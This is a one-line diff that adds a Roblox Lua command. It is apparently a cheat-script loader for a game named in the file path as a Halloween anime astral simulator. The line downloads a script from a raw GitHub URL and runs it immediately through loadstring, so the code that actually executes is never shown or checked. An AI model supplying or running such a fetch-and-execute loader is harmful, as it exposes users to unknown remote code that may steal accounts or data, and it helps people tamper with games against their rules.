@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/halloween-anime-astral-simulator-spam1-o7lzesnmodcgm4.lua"))()
